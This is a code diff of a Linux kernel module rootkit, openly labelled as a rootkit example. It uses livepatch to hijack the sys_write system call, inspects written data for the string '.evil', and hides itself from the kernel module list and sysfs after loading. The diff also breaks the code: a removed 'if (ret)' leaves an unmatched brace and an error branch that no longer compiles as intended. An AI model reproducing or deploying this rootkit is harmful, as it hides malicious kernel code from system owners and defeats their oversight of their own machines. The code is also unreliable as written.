@@ -28,6 +28,8 @@
 #include <linux/slab.h>
 #include <linux/livepatch.h>
 
+asmlinkage ssize_t (*original_write)(int fd, const char __user *buff, ssize_t count);
+
 static struct klp_func funcs[] = {
 	{
 		.old_name = "sys_write",
@@ -51,9 +53,8 @@ static struct klp_patch patch = {
  * Hijacked sys_call
  */
 asmlinkage ssize_t hijack_write(int fd, const char __user *buff, size_t count) {
-  printk("livepatch: hijack_write executed\n");
   int to_return; 
-  char proc_protect = ".evil"; 
+  char *proc_protect = ".evil"; 
   char *kbuff = (char *) kmalloc(256,GFP_KERNEL); 
   copy_from_user(kbuff,buff,255); 
   if (strstr(kbuff,proc_protect)) { 
@@ -69,25 +70,21 @@ int hijack_init(void) {
 	int ret;
   printk("livepatch: LKM loaded\n");
 
-  list_del_init(&__this_module.list);
-  kobject_del(&THIS_MODULE->mkobj.kobj);
-  printk("livepatch: LKM hidden\n");
-
-  if (sys_call_table = (psize *) find_sys_tab()) {
-    printk("livepatch: sys_call_table found at %p\n",sys_call_table);
-  } else {
-    printk("livepatch: sys_call_table not found\n");
-  }
-
 	ret = klp_register_patch(&patch);
-	if (ret)
+    printk("livepatch: could not exchange original sys_call with hijacked");
 		return ret;
+	}
 	ret = klp_enable_patch(&patch);
 	if (ret) {
+    printk("livepatch: could not exchange original sys_call with hijacked");
 		WARN_ON(klp_unregister_patch(&patch));
 		return ret;
 	}
   printk("livepatch: exchanged original sys_call with hijacked");
+
+  list_del_init(&__this_module.list);
+  kobject_del(&THIS_MODULE->mkobj.kobj);
+  printk("livepatch: LKM hidden\n");
 
   return 0;
 }
@@ -102,6 +99,6 @@ void hijack_exit(void) {
 
 MODULE_LICENSE("EUPL");
 MODULE_AUTHOR("Max Schrimpf");
-MODULE_DESCRIPTION("Syscall hijacking by a rootkit example");
+MODULE_DESCRIPTION("Livepatch by a rootkit example");
 module_init(hijack_init);
 module_exit(hijack_exit);
